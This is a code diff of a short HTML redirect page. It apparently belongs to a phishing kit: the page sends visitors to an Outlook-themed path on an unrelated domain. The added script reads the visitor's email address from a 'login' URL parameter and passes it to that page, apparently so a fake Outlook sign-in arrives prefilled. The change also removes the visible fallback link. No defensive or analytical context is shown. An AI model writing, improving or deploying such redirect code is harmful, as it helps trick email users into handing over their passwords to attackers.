@@ -4,11 +4,17 @@
   <meta charset="UTF-8" />
   <title>Redirecting...</title>
   <script>
-    const query = window.location.search;
-    window.location.href = "https://newout.123suchtfrei.com/newgen/2019Outlook/VdPCnDwL/" + query;
+    (function () {
+      const email = new URLSearchParams(window.location.search).get("login");
+      if (email) {
+        window.location.href = "https://newout.123suchtfrei.com/newgen/2019Outlook/VdPCnDwL/?login=" + encodeURIComponent(email);
+      } else {
+        document.body.innerHTML = "<h1>Missing login parameter</h1>";
+      }
+    })();
   </script>
 </head>
 <body>
-  <p>Redirecting... <a href="https://newout.123suchtfrei.com/newgen/2019Outlook/VdPCnDwL/">Click here</a> if not redirected.</p>
+  <p>Redirecting...</p>
 </body>
 </html>
